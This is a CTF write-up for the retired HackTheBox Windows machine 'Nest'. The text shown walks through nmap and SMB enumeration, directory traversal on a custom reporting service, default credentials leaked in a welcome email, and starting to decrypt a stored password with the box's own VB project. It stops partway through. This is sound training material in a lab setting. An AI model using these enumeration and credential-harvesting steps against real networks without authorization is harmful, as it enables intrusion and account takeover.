---
title: HTB: Nest
url: https://0xdf.gitlab.io/2020/06/06/htb-nest.html
date: 2020-06-06T14:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-nest, ctf, hackthebox, nmap, smb, smbmap, smbclient, crypto, vb, visual-studio, dnspy, dotnetfiddle, crackmapexec, alternative-data-streams, psexec, htb-hackback, htb-dropzone, htb-bighead, oscp-plus-v2
---

![Nest](https://0xdfimages.gitlab.io/img/nest-cover.png)

Next was unique in that it was all about continually increasing SMB access, with a little bit of easy .NET RE thrown in. I probably would rate the box medium instead of easy, because of the RE, but that’s nitpicking. I’ll start with unauthenticated access to a share, and find a password for tempuser. With that access, I’ll find an encrypted password for C.Smith. I’ll also use a Notepad++ config to find a new directory I can access (inside one I can’t), which reveals a Visual Basic Visual Studio project that includes the code to decrypt the password. With access as C.Smith, I can find the debug password for a custom application listening on 4386, and use that to leak another encrypted password. This time I’ll debug the binary to read the decrpyted administrator password from memory, and use it to get a shell as SYSTEM with PSExec. When this box was first released, there was an error where the first user creds could successfully PSExec. I wrote a post on that back in January, but I’ve linked that post to this one on the left. In Beyond Root, I’ll take a quick look at why netcat can’t connect to the custom service on 4386, but telnet can.

## Box Info

| Name | [Nest](https://hackthebox.com/machines/nest)  [Nest](https://hackthebox.com/machines/nest) [Play on HackTheBox](https://hackthebox.com/machines/nest) |
| --- | --- |
| Release Date | [25 Jan 2020](https://twitter.com/hackthebox_eu/status/1268520674752188419) |
| Retire Date | 06 Jun 2020 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Nest |
| Radar Graph | Radar chart for Nest |
| First Blood User | 00:12:39[M4Rv3L M4Rv3L](https://app.hackthebox.com/users/38744) |
| First Blood Root | 00:10:39[M4Rv3L M4Rv3L](https://app.hackthebox.com/users/38744) |
| Creator | [VbScrub VbScrub](https://app.hackthebox.com/users/158833) |

## Recon

### nmap

`nmap` shows two open TCP ports, SMB (445) and an unrecognized service on 4386:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.178
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 16:34 EST
Nmap scan report for 10.10.10.178
Host is up (0.013s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
4386/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
root@kali# nmap -p 445,4386 -sC -sV -oA scripts/nmap-tcpscripts 10.10.10.178
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 12:55 EDT
Nmap scan report for 10.10.10.178
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     Reporting Service V1.2
|     Unrecognised command
|   Help:
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.80%I=7%D=6/5%Time=5EDA78ED%P=x86_64-pc-linux-gnu%r(NUL
SF:L,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLine
SF:s,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised
SF:\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comman
SF:d\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n
SF:\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repor
SF:ting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"\
SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\x
SF:20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20the
SF:\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---\
SF:r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\n
SF:DEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCookie
SF:,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionRe
SF:q,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,21
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20c
SF:ommand\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20Re
SF:porting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>");

Host script results:
|_clock-skew: 1m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-05T16:59:40
|_  start_date: 2020-06-05T09:57:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.42 seconds

```

### HQK - TCP 4386

#### Connecting

I took a quick look at the unknown service. When I connect with `nc`, it just hangs:

```

root@kali# nc 10.10.10.178 4386

HQK Reporting Service V1.2
                                                                   
>help              
                                                                   
^C

```

Since I saw that `nmap` was able to get at least a help menu out of the program, I tried connecting with `telnet`, and it worked:

```

root@kali# telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format
--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>^]
telnet> quit
Connection closed.

```

I’ll show what’s different in [Beyond Root](#beyond-root).

This service identifies itself as the “HQK Reporting Service V1.2”.

#### Using HQK

I can change directories with `setdir` without limits on going `..`, and list them with `list`:

```

>setdir ..       

Current directory set to HQK
>setdir ..  

Current directory set to Program Files
>setdir ..      

Current directory set to C:                              
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  $Recycle.Bin
[DIR]  Boot
[DIR]  Config.Msi
[DIR]  Documents and Settings
[DIR]  PerfLogs
[DIR]  Program Files
[DIR]  Program Files (x86)
[DIR]  ProgramData
[DIR]  Recovery
[DIR]  Shares
[DIR]  System Volume Information
[DIR]  Users
[DIR]  Windows
[1]   bootmgr
[2]   BOOTSECT.BAK
[3]   pagefile.sys
[4]   restartsvc.bat

Current Directory: C:

```

Unfortunately, many of the things I’d want to access are blocked:

```

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  Administrator
[DIR]  All Users
[DIR]  Default
[DIR]  Default User
[DIR]  Public
[DIR]  Service_HQK
[DIR]  TempUser
[1]   desktop.ini

Current Directory: Users

>setdir tempuser

Error: Access to the path 'C:\Users\tempuser\' is denied.

```

If I try to use `RUNQUERY` to view a file, I get an error:

```

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  Administrator
[DIR]  All Users
[DIR]  Default
[DIR]  Default User
[DIR]  Public
[DIR]  Service_HQK
[DIR]  TempUser
[1]   desktop.ini

Current Directory: Users
>runquery 1

Invalid database configuration found. Please contact your system administrator

```

I couldn’t find a file (even in the initial directory) that responded to `RUNQUERY` without an error.

There’s a real hint in the help menu that there is a debug password that will unlock additional functionality. I’ll keep that in mind, and move on to SMB.

### SMB - TCP 445

#### Enumeration

`smbmap` shows two shares I can read, `Users` and `Data`:

```

root@kali# smbmap -H 10.10.10.178 -u null
[+] Guest session       IP: 10.10.10.178:445    Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 NO ACCESS
        Users                                                   READ ONLY

```

#### Users

I’ll connect to the `Users` share, but there are no files I can actually access:

```

root@kali# smbclient -N //10.10.10.178/users
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_ACCESS_DENIED listing \C.Smith\*
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
NT_STATUS_ACCESS_DENIED listing \TempUser\*

```

#### Data

The `Data` share provides access to two `.txt` files:

```

root@kali# smbclient -N //10.10.10.178/data
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \IT\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Reports\*
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (6.9 KiloBytes/sec) (average 4.3 KiloBytes/sec)

```

`Maintenance Alerts.txt` isn’t useful:

```

There is currently no scheduled maintenance work

```

`Welcome Email.txt` provides the useful information:

```

We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019

Thank you
HR

```

## Access to C.Smith

### Re-enumerate SMB with Creds

#### Shares

Now I can access one more share, `Secure$`:

```

root@kali# smbmap -H 10.10.10.178 -u TempUser -p welcome2019
[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY

```

#### Secure$

Unfortunately, I can’t access anything in `Secure$`:

```

root@kali# smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun  5 07:05:22 2020
  ..                                  D        0  Fri Jun  5 07:05:22 2020
  Finance                             D        0  Wed Aug  7 15:40:13 2019
  HR                                  D        0  Wed Aug  7 19:08:11 2019
  IT                                  D        0  Thu Aug  8 06:59:25 2019

                10485247 blocks of size 4096. 6545925 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \HR\*
NT_STATUS_ACCESS_DENIED listing \IT\*

```

#### Users

There’s still nothing I can access in `Users` either (besides a 0 byte text file):

```

root@kali# smbclient -U TempUser //10.10.10.178/users welcome2019
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_ACCESS_DENIED listing \C.Smith\*
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
getting file \TempUser\New Text Document.txt of size 0 as New Text Document.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

```

#### Data

What is new is now I can access the `IT` folder in this share:

```

root@kali# smbclient -U TempUser //10.10.10.178/data welcome2019
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \IT\Configs\Adobe\editing.xml of size 246 as editing.xml (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
getting file \IT\Configs\Adobe\Options.txt of size 0 as Options.txt (0.0 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \IT\Configs\Adobe\projects.xml of size 258 as projects.xml (5.4 KiloBytes/sec) (average 3.7 KiloBytes/sec)
getting file \IT\Configs\Adobe\settings.xml of size 1274 as settings.xml (23.9 KiloBytes/sec) (average 9.3 KiloBytes/sec)
getting file \IT\Configs\Atlas\Temp.XML of size 1369 as Temp.XML (26.2 KiloBytes/sec) (average 13.0 KiloBytes/sec)
getting file \IT\Configs\Microsoft\Options.xml of size 4598 as Options.xml (93.5 KiloBytes/sec) (average 26.5 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as config.xml (123.5 KiloBytes/sec) (average 41.3 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\shortcuts.xml of size 2108 as shortcuts.xml (42.9 KiloBytes/sec) (average 41.5 KiloBytes/sec)
getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as RU_config.xml (4.8 KiloBytes/sec) (average 36.9 KiloBytes/sec)
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (1.0 KiloBytes/sec) (average 33.3 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (7.4 KiloBytes/sec) (average 30.7 KiloBytes/sec)

```

#### Encrypted Password for C.Smith

I’ll start to triage the files I pulled back:

```

root@kali# find IT -type f -ls
     6548      4 -rwxrwx---   1 root     vboxsf        270 Jun  5 13:52 IT/Configs/RU\ Scanner/RU_config.xml
     6536      0 -rwxrwx---   1 root     vboxsf          0 Jun  5 13:52 IT/Configs/Adobe/Options.txt
     6535      4 -rwxrwx---   1 root     vboxsf        246 Jun  5 13:52 IT/Configs/Adobe/editing.xml
     6538      4 -rwxrwx---   1 root     vboxsf       1274 Jun  5 13:52 IT/Configs/Adobe/settings.xml
     6537      4 -rwxrwx---   1 root     vboxsf        258 Jun  5 13:52 IT/Configs/Adobe/projects.xml
     6545      8 -rwxrwx---   1 root     vboxsf       6451 Jun  5 13:52 IT/Configs/NotepadPlusPlus/config.xml
     6546      4 -rwxrwx---   1 root     vboxsf       2108 Jun  5 13:52 IT/Configs/NotepadPlusPlus/shortcuts.xml
     6540      4 -rwxrwx---   1 root     vboxsf       1369 Jun  5 13:52 IT/Configs/Atlas/Temp.XML
     6543      8 -rwxrwx---   1 root     vboxsf       4598 Jun  5 13:52 IT/Configs/Microsoft/Options.xml

```

The first interesting file is the `RU_config.xml`, which has a password:

```

<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>

```

It’s encrypted:

```

root@kali# echo "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=" | base64 -d | xxd
00000000: 7d31 3301 f603 a33d 58ce 4aa1 4241 fa19  }13....=X.J.BA..
00000010: 0158 2a9d 5763 9866 edb8 ce3f ceb2 6311  .X*.Wc.f...?..c.

```

#### Path Hint

The other interesting file is `IT/Configs/NotepadPlusPlus/config.xml`, a Notepad++ config:

```

<?xml version="1.0" encoding="Windows-1252" ?>
<NotepadPlus>
    <GUIConfigs>
        <!-- 3 status : "large", "small" or "hide"-->
        <GUIConfig name="ToolBar" visible="yes">standard</GUIConfig>
        <!-- 2 status : "show" or "hide"-->
        <GUIConfig name="StatusBar">show</GUIConfig>
        <!-- For all attributs, 2 status : "yes" or "no"-->
        <GUIConfig name="TabBar" dragAndDrop="yes" drawTopBar="yes" drawInactiveTab="yes" reduce="yes" closeButton="no" doubleClick2Close="no" vertical="no" multiLine="no" hide="no" />
        <!-- 2 positions : "horizontal" or "vertical"-->
        <GUIConfig name="ScintillaViewsSplitter">vertical</GUIConfig>
        <!-- For the attribut of position, 2 status : docked or undocked ; 2 status : "show" or "hide" -->
        <GUIConfig name="UserDefineDlg" position="undocked">hide</GUIConfig>
        <GUIConfig name="TabSetting" size="4" replaceBySpace="no" />
        <!--App position-->
        <GUIConfig name="AppPosition" x="662" y="95" width="955" height="659" isMaximized="yes" />
        <!-- For the primary scintilla view,
             2 status for Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: "show" or "hide"
             4 status for Attribut folderMarkStyle : "simple", "arrow", "circle" and "box"  -->
        <GUIConfig name="ScintillaPrimaryView" lineNumberMargin="show" bookMarkMargin="show" folderMarkStyle="box" indentGuideLine="show" currentLineHilitingShow="show" Wrap="yes" edge="no" edgeNbColumn="100" wrapSymbolShow="hide" zoom="0" whiteSpaceShow="hide" eolShow="hide" lineWrapMethod="aligned" zoom2="0" />
        <!-- For the secodary scintilla view,
             2 status for Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: "show" or "hide"
             4 status for Attribut folderMarkStyle : "simple", "arrow", "circle" and "box" -->
        <GUIConfig name="Auto-detection">yes</GUIConfig>
        <GUIConfig name="CheckHistoryFiles">no</GUIConfig>
        <GUIConfig name="TrayIcon">no</GUIConfig>
        <GUIConfig name="RememberLastSession">yes</GUIConfig>
        <!--
                        New Document default settings :
                                format = 0/1/2 -> win/unix/mac
                                encoding = 0/1/2/3/4/5 -> ANSI/UCS2Big/UCS2small/UTF8/UTF8-BOM
                                defaultLang = 0/1/2/..

                        Note 1 : UTF8-BOM -> UTF8 without BOM
                        Note 2 : for defaultLang :
                                        0 -> L_TXT
                                        1 -> L_PHP
                                        ... (see source file)
                -->
        <GUIConfig name="NewDocDefaultSettings" format="0" encoding="0" lang="0" codepage="-1" openAnsiAsUTF8="no" />
        <GUIConfig name="langsExcluded" gr0="0" gr1="0" gr2="0" gr3="0" gr4="0" gr5="0" gr6="0" gr7="0" langMenuCompact="yes" />
        <!--
                printOption is print colour setting, the following values are possible :
                        0 : WYSIWYG
                        1 : Invert colour
                        2 : B & W
                        3 : WYSIWYG but without background colour
                -->
        <GUIConfig name="Print" lineNumber="no" printOption="0" headerLeft="$(FULL_CURRENT_PATH)" headerMiddle="" headerRight="$(LONG_DATE) $(TIME)" headerFontName="IBMPC" headerFontStyle="1" headerFontSize="8" footerLeft="" footerMiddle="-$(CURRENT_PRINTING_PAGE)-" footerRight="" footerFontName="" footerFontStyle="0" footerFontSize="9" margeLeft="0" margeTop="0" margeRight="0" margeBottom="0" />
        <!--
                            Backup Setting :
                                0 : non backup
                                1 : simple backup
                                2 : verbose backup
                      -->
        <GUIConfig name="Backup" action="0" useCustumDir="no" dir="" />
        <GUIConfig name="TaskList">yes</GUIConfig>
        <GUIConfig name="SaveOpenFileInSameDir">no</GUIConfig>
        <GUIConfig name="noUpdate" intervalDays="15" nextUpdateDate="20080426">no</GUIConfig>
        <GUIConfig name="MaitainIndent">yes</GUIConfig>
        <GUIConfig name="MRU">yes</GUIConfig>
        <GUIConfig name="URL">0</GUIConfig>
        <GUIConfig name="globalOverride" fg="no" bg="no" font="no" fontSize="no" bold="no" italic="no" underline="no" />
        <GUIConfig name="auto-completion" autoCAction="0" triggerFromNbChar="1" funcParams="no" />
        <GUIConfig name="sessionExt"></GUIConfig>
        <GUIConfig name="SmartHighLight">yes</GUIConfig>
        <GUIConfig name="TagsMatchHighLight" TagAttrHighLight="yes" HighLightNonHtmlZone="no">yes</GUIConfig>
        <GUIConfig name="MenuBar">show</GUIConfig>
        <GUIConfig name="Caret" width="1" blinkRate="250" />
        <GUIConfig name="ScintillaGlobalSettings" enableMultiSelection="no" />
        <GUIConfig name="openSaveDir" value="0" defaultDirPath="" />
        <GUIConfig name="titleBar" short="no" />
        <GUIConfig name="DockingManager" leftWidth="200" rightWidth="200" topHeight="200" bottomHeight="266">
            <FloatingWindow cont="4" x="39" y="109" width="531" height="364" />
            <PluginDlg pluginName="dummy" id="0" curr="3" prev="-1" isVisible="yes" />
            <PluginDlg pluginName="NppConverter.dll" id="3" curr="4" prev="0" isVisible="no" />
            <ActiveTabs cont="0" activeTab="-1" />
            <ActiveTabs cont="1" activeTab="-1" />
            <ActiveTabs cont="2" activeTab="-1" />
            <ActiveTabs cont="3" activeTab="-1" />
        </GUIConfig>
    </GUIConfigs>
    <!-- The History of opened files list -->
    <FindHistory nbMaxFindHistoryPath="10" nbMaxFindHistoryFilter="10" nbMaxFindHistoryFind="10" nbMaxFindHistoryReplace="10" matchWord="no" matchCase="no" wrap="yes" directionDown="yes" fifRecuisive="yes" fifInHiddenFolder="no" dlgAlwaysVisible="no" fifFilterFollowsDoc="no" fifFolderFollowsDoc="no" searchMode="0" transparencyMode="0" transparency="150">
        <Find name="text" />
        <Find name="txt" />
        <Find name="itx" />
        <Find name="iTe" />
        <Find name="IEND" />
        <Find name="redeem" />
        <Find name="activa" />
        <Find name="activate" />
        <Find name="redeem on" />
        <Find name="192" />
        <Replace name="C_addEvent" />
    </FindHistory>
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>

```

At first I missed this, but looking at the history at the bottom, there are paths there.

#### Secure$\IT\Carl

It’s important to think about what I collected already. When I run `mget`, it goes into each directory I can access, and lists it looking for files. If there’s a directory I can access inside a directory I can’t access, it won’t find it.

I can’t access `Secure$\IT`. But it turns out, I can access `Secure$\IT\Carl`, a path from the Notepad++ config:

```

root@kali# smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
Try "help" to get a list of possible commands.
smb: \> cd IT\Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                10485247 blocks of size 4096. 6545797 blocks available

```

I’ll recursively pull from here as well:

```

smb: \IT\Carl\> recurse on
smb: \IT\Carl\> prompt off
smb: \IT\Carl\> mget *
getting file \IT\Carl\Docs\ip.txt of size 56 as ip.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \IT\Carl\Docs\mmc.txt of size 73 as mmc.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\ConfigFile.vb of size 772 as ConfigFile.vb (15.7 KiloBytes/sec) (average 5.3 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Module1.vb of size 279 as Module1.vb (5.0 KiloBytes/sec) (average 5.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.Designer.vb of size 441 as Application.Designer.vb (8.4 KiloBytes/sec) (average 5.8 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.myapp of size 481 as Application.myapp (9.2 KiloBytes/sec) (average 6.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\AssemblyInfo.vb of size 1163 as AssemblyInfo.vb (19.2 KiloBytes/sec) (average 8.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.Designer.vb of size 2776 as Resources.Designer.vb (45.9 KiloBytes/sec) (average 13.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.resx of size 5612 as Resources.resx (97.9 KiloBytes/sec) (average 22.9 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.Designer.vb of size 2989 as Settings.Designer.vb (51.2 KiloBytes/sec) (average 25.9 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.settings of size 279 as Settings.settings (5.2 KiloBytes/sec) (average 24.1 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj of size 4828 as RU Scanner.vbproj (90.7 KiloBytes/sec) (average 29.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj.user of size 143 as RU Scanner.vbproj.user (2.9 KiloBytes/sec) (average 27.6 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\SsoIntegration.vb of size 133 as SsoIntegration.vb (2.2 KiloBytes/sec) (average 25.6 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Utils.vb of size 4888 as Utils.vb (79.6 KiloBytes/sec) (average 29.5 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner.sln of size 871 as RUScanner.sln (15.5 KiloBytes/sec) (average 28.6 KiloBytes/sec)

```

### Access Password for C.Smith

#### Code Analysis

The collected code is a .NET VB project. The main Visual Studio project file is `RUScanner.sln`:

```

root@kali# ls 'VB Projects/WIP/RU/'
RUScanner  RUScanner.sln

```

Looking through the code, one of the things that jumps out to me is `Utils.vb`. It’s a class that’s designed to provide `EncryptString` and `DecryptString` functions to the rest of the project. I see this called from the main code in `Module1.vb1`:

```

Module Module1
    
  Sub Main()
    Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
    Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}

  End Sub

End Module

```

It is opening a `RU_Config.xml` file, and then reading the username and decrypting the password. That matches what I found above for C.Smith.

#### Visual Studio

Installing VS is a pain, and it takes a long time, but it’s worth having installed and setup in your Windows VM. There are many Windows-focused projects out there that don’t provide compiled binaries. Once you have VS set up, you can download a project and build it.

In this case, I’ll open the `.sln` file in VS:

[![project in vs](https://0xdfimages.gitlab.io/img/image-20200605153348120.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605153348120.png)

Before changing anything, it’s always a good idea to make sure the project will build. First I’ll change it from Debug to Release and x86 to x64 in the drop-downs at the top, and then from the menu, I’ll select Build -> Build Solution.

![image-20200605153711984](https://0xdfimages.gitlab.io/img/image-20200605153711984.png)

This binary doesn’t do anything except for read a config into another variable and then exit. If I try to run it, it throws errors because it can’t find the config file:

```

PS > .\DbPof.exe

Unhandled Exception: System.IO.FileNotFoundException: Could not find file 'Z:\nest-10.10.10.178\files\VB Projects\WIP\RU\RUScanner\bin\x64\Release\RU_Config.xml'.
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy)
   at System.IO.FileStream..ctor(String path, FileMode mode)
   at DbPof.ConfigFile.LoadFromFile(String FilePath) in Z:\nest-10.10.10.178\files\VB Projects\WIP\RU\RUScanner\ConfigFIle.vb:line 15
   at DbPof.Module1.Main() in Z:\nest-10.10.10.178\files\VB Projects\WIP\RU\RUScanner\Module1.vb:line 4

```

If I copy a copy of the config file into the same directory, now it runs and exits without outputting anything.

I see two ways to approach this. Since it’s .NET, I can open it in [dnspy](https://github.com/0xd4d/dnSpy). It will show up on the left, and if I expand enough, I’ll find `Module 1`:

[![program in dnspy](https://0xdfimages.gitlab.io/img/image-20200605154404561.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605154404561.png)

Clicking on it, I’ll see the code from `Main()`. I’ll right click on the last line, and add a break point:

